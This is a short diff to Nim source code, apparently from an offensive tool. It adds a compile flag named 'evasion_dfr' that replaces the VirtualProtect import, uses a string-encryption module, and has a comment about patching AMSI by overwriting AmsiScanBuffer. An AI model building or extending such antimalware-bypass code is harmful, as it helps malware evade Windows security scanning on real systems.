@@ -1,4 +1,8 @@
-import winim/lean
+when defined(evasion_dfr):
+  import winim/lean except VirtualProtect
+  import winapi
+else:
+  import winim/lean
 import strenc
 
 # Patch AMSI by overwriting AmsiScanBuffer at offset 0x1B
